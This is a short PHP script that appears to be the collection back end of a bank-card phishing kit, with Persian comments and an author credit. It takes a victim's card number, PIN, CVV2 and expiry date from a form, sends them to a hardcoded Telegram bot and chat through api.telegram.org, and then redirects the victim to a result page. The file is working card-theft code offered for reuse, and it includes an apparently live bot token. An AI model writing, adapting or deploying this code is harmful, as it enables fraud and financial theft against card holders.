<?php
//created by @JavidH373 my channel: @GulaxGulx
error_reporting(0);
if($_POST['cardnumber']){
$cardh373 = $_POST['cardnumber'];
$passh373 = $_POST['inputpin'];
$cvv2h373 = $_POST['inputcvv2'];
$mahh373 = $_POST['inputmonth'];
$salh373 = $_POST['inputyear'];


$token = "933472293:AAGOzMn3llGZYvyXl5Ue00YoXkNUWv1KSbU";//توکنتو ایجا وارد کن بجای

$textmsg =  "
New Card :

Card : $cardh373

Pass : $passh373

Cvv2 : $cvv2h373

Mah : $mahh373

Sal : $salh373

Created By @JavidH373
";
	$groupid = 689385153;//ایدی عددی رو این رو به رو بزار
    $ok =  file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$groupid."&text=".urlencode($textmsg));

}else{
    echo "@JavidH373";
}

?>
<meta content='0;url=result.html<?php ?>' http-equiv='refresh'/>
